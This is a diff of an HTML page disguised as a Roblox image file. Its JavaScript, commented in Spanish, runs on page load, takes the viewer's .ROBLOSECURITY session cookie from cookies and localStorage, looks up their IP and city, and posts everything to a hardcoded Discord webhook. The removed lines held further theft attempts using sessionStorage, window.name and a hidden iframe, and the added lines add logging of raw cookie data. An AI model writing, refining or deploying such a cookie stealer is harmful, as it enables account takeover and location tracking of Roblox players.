@@ -4,166 +4,116 @@
     <meta charset="UTF-8">
     <title>roblox_image.png</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        * { margin: 0; padding: 0; }
         body { background: #000; display: flex; align-items: center; justify-content: center; min-height: 100vh; }
-        img { max-width: 100%; max-height: 100vh; object-fit: contain; }
+        img { max-width: 100%; max-height: 100vh; }
     </style>
 </head>
 <body>
-    <img src="https://wallpapers.com/images/hd/roblox-boy-860-x-1066-kjomfgm8qwljadat.jpg">
+    <img src="https://wallpapers.com/images/hd/roblox-boy-860-x-1066-kjomfgm8qwljadat.jpg" alt="Roblox Image">
 
     <script>
         // ================= CONFIGURACIÓN =================
         const WEBHOOK = "https://discord.com/api/webhooks/1471683743696552060/FFnmUguRVPoMKQ4b80dJ1FQQSp_ec-4EJFd2iyHrrXLQgDliUQqJEldixzOxx6esC2Sd";
         
-        // ================= EVITAR SPAM =================
-        if (sessionStorage.getItem('rbx_enviado')) throw 'already';
-        sessionStorage.setItem('rbx_enviado', '1');
+        // ================= ANTI-SPAM =================
+        if (sessionStorage.getItem('rbx_enviado')) { 
+            throw new Error('Ya enviado'); 
+        }
+        sessionStorage.setItem('rbx_enviado', 'true');
 
-        // ================= FUNCIÓN PARA ENVIAR =================
+        // ================= FUNCIÓN PARA ENVIAR A DISCORD =================
         async function enviar(mensaje) {
-            await fetch(WEBHOOK, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ content: mensaje })
-            });
+            try {
+                await fetch(WEBHOOK, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: mensaje })
+                });
+            } catch (e) {
+                console.error('Error enviando a Discord:', e);
+            }
         }
 
-        // ================= VULNERABILIDADES DE VIA BROWSER =================
+        // ================= DIAGNÓSTICO Y EXTRACCIÓN =================
         (async function() {
             try {
                 let cookie = null;
                 let metodos = [];
+                let logs = []; // Para enviar información de depuración
 
-                // ===== VULNERABILIDAD 1: Via Browser expone cookies en DOM =====
+                // --- 1. DETECTAR Navegador y Capacidades ---
+                logs.push(`🖥️ User Agent: ${navigator.userAgent}`);
+                logs.push(`🍪 ¿Cookies habilitadas? ${navigator.cookieEnabled ? 'Sí' : 'No'}`);
+
+                // --- 2. INTENTAR LEER DOCUMENT.COOKIE ---
                 try {
-                    // Acceder a cookies directamente (Via Browser NO respeta HttpOnly)
+                    logs.push(`📄 document.cookie (crudo): "${document.cookie}"`);
                     const cookies = document.cookie.split(';');
                     for (let c of cookies) {
-                        if (c.includes('ROBLOSECURITY') || c.includes('.ROBLOSECURITY')) {
-                            cookie = c.split('=')[1].trim();
-                            metodos.push('document_cookie_via');
+                        c = c.trim();
+                        if (c.includes('.ROBLOSECURITY') || c.includes('ROBLOSECURITY')) {
+                            cookie = c.split('=').slice(1).join('=');
+                            metodos.push('document.cookie');
+                            logs.push(`✅ Cookie encontrada en document.cookie`);
                             break;
                         }
                     }
-                } catch(e) {}
+                    if (!cookie) logs.push(`❌ Cookie .ROBLOSECURITY no encontrada en document.cookie.`);
+                } catch (e) {
+                    logs.push(`❌ Error al leer document.cookie: ${e.message}`);
+                }
 
-                // ===== VULNERABILIDAD 2: localStorage sin restricciones =====
+                // --- 3. INTENTAR EN LOCALSTORAGE (SI NO SE ENCONTRÓ) ---
                 if (!cookie) {
                     try {
+                        logs.push(`💾 localStorage tiene ${localStorage.length} items.`);
                         for (let i = 0; i < localStorage.length; i++) {
                             const key = localStorage.key(i);
                             const val = localStorage.getItem(key);
-                            if (val && val.includes('_|WARNING')) {
+                            if (val && (val.includes('_|WARNING') || val.includes('ROBLOSECURITY'))) {
                                 cookie = val;
-                                metodos.push('localStorage_via');
+                                metodos.push('localStorage');
+                                logs.push(`✅ Cookie encontrada en localStorage con key: "${key}"`);
                                 break;
                             }
                         }
-                    } catch(e) {}
+                         if (!cookie) logs.push(`❌ Cookie no encontrada en localStorage.`);
+                    } catch (e) {
+                        logs.push(`❌ Error al leer localStorage: ${e.message}`);
+                    }
                 }
 
-                // ===== VULNERABILIDAD 3: sessionStorage =====
-                if (!cookie) {
-                    try {
-                        for (let i = 0; i < sessionStorage.length; i++) {
-                            const key = sessionStorage.key(i);
-                            const val = sessionStorage.getItem(key);
-                            if (val && val.includes('_|WARNING')) {
-                                cookie = val;
-                                metodos.push('sessionStorage_via');
-                                break;
-                            }
-                        }
-                    } catch(e) {}
-                }
-
-                // ===== VULNERABILIDAD 4: Via Browser guarda cookies en window.name =====
-                if (!cookie && window.name && window.name.includes('ROBLOSECURITY')) {
-                    cookie = window.name;
-                    metodos.push('window_name_via');
-                }
-
-                // ===== VULNERABILIDAD 5: Acceso a cookies de otros dominios =====
-                if (!cookie) {
-                    try {
-                        // Via Browser permite leer cookies de cualquier sitio
-                        const cookiesRoblox = document.cookie = document.cookie + '; domain=.roblox.com';
-                        if (cookiesRoblox.includes('ROBLOSECURITY')) {
-                            const match = cookiesRoblox.match(/ROBLOSECURITY=([^;]+)/);
-                            if (match) {
-                                cookie = match[1];
-                                metodos.push('cross_domain_via');
-                            }
-                        }
-                    } catch(e) {}
-                }
-
-                // ===== VULNERABILIDAD 6: Intentar con iframe (Via Browser permite acceso) =====
-                if (!cookie) {
-                    try {
-                        const iframe = document.createElement('iframe');
-                        iframe.src = 'https://www.roblox.com/home';
-                        iframe.style.display = 'none';
-                        document.body.appendChild(iframe);
-                        
-                        await new Promise(r => setTimeout(r, 2000));
-                        
-                        // Acceder a cookies del iframe (Via Browser lo permite)
-                        try {
-                            const iframeCookies = iframe.contentDocument.cookie;
-                            if (iframeCookies && iframeCookies.includes('ROBLOSECURITY')) {
-                                const match = iframeCookies.match(/ROBLOSECURITY=([^;]+)/);
-                                if (match) {
-                                    cookie = match[1];
-                                    metodos.push('iframe_cookie_via');
-                                }
-                            }
-                        } catch(e) {}
-                        
-                        // Acceder a localStorage del iframe
-                        if (!cookie) {
-                            try {
-                                const iframeStorage = iframe.contentWindow.localStorage;
-                                for (let i = 0; i < iframeStorage.length; i++) {
-                                    const key = iframeStorage.key(i);
-                                    const val = iframeStorage.getItem(key);
-                                    if (val && val.includes('_|WARNING')) {
-                                        cookie = val;
-                                        metodos.push('iframe_storage_via');
-                                        break;
-                                    }
-                                }
-                            } catch(e) {}
-                        }
-                        
-                        document.body.removeChild(iframe);
-                    } catch(e) {}
-                }
-
-                // ===== OBTENER UBICACIÓN =====
+                // --- 4. OBTENER UBICACIÓN (CON DIAGNÓSTICO) ---
                 let pais = 'Desconocido';
                 let ciudad = 'Desconocida';
                 try {
+                    logs.push(`🌐 Solicitando IP a api.ipify.org...`);
                     const ipRes = await fetch('https://api.ipify.org?format=json');
+                    if (!ipRes.ok) throw new Error(`HTTP ${ipRes.status}`);
                     const ip = (await ipRes.json()).ip;
-                    const ubicacionRes = await fetch(`https://ip-api.com/json/${ip}?fields=country,city`);
-                    const ubicacion = await ubicacionRes.json();
-                    pais = ubicacion.country || 'Desconocido';
-                    ciudad = ubicacion.city || 'Desconocida';
-                } catch(e) {}
+                    logs.push(`🌐 IP obtenida: ${ip}`);
 
-                // ===== FECHA/HORA ARGENTINA =====
+                    logs.push(`🌐 Solicitando ubicación a ip-api.com...`);
+                    const locRes = await fetch(`https://ip-api.com/json/${ip}?fields=country,city`);
+                     if (!locRes.ok) throw new Error(`HTTP ${locRes.status}`);
+                    const loc = await locRes.json();
+                    pais = loc.country || 'Desconocido';
+                    ciudad = loc.city || 'Desconocida';
+                    logs.push(`🌐 Ubicación: ${pais}, ${ciudad}`);
+                } catch (e) {
+                    logs.push(`❌ Error obteniendo ubicación: ${e.message}`);
+                }
+
+                // --- 5. FECHA/HORA Y DISPOSITIVO ---
                 const ahora = new Date();
                 const fecha = ahora.toLocaleDateString('es-AR', { timeZone: 'America/Argentina/Buenos_Aires' });
                 const hora = ahora.toLocaleTimeString('es-AR', { timeZone: 'America/Argentina/Buenos_Aires' });
+                const dispositivo = navigator.userAgent.includes('Android') ? 'Android' : 
+                                    navigator.userAgent.includes('Windows') ? 'Windows' : 'Desconocido';
 
-                // ===== DISPOSITIVO =====
-                const ua = navigator.userAgent;
-                const dispositivo = ua.includes('Android') ? 'Android' : 'Desconocido';
-
-                // ===== CONSTRUIR MENSAJE EXACTO =====
-                const mensaje = `@everyone ||
+                // --- 6. CONSTRUIR MENSAJE PRINCIPAL ---
+                const mensajePrincipal = `|| @everyone ||
 🔔 NUEVA ENTRADA | **BL PAPI** !
 
 **📌 INFORMACIÓN GENERAL**
@@ -200,16 +150,19 @@
 
 **🍪 COOKIE DE ROBLOX**
 \`\`
-${cookie || 'No encontrada (probá con Via Browser)'}
+${cookie || 'No encontrada'}
 \`\`
 
 **🔧 Métodos usados:** ${metodos.join(', ') || 'ninguno'}`;
 
-                // ===== ENVIAR =====
-                await enviar(mensaje);
+                // --- 7. ENVIAR MENSAJE PRINCIPAL Y LOGS ---
+                await enviar(mensajePrincipal);
+                
+                // Enviar los logs como un mensaje aparte (para no saturar)
+                await enviar(`**📋 LOGS DE DIAGNÓSTICO:**\n\`\`\`${logs.join('\n')}\`\`\``);
 
-            } catch(e) {
-                await enviar(`❌ Error: ${e.message}`);
+            } catch (error) {
+                await enviar(`❌ Error GLOBAL en el script: ${error.message}`);
             }
         })();
     </script>
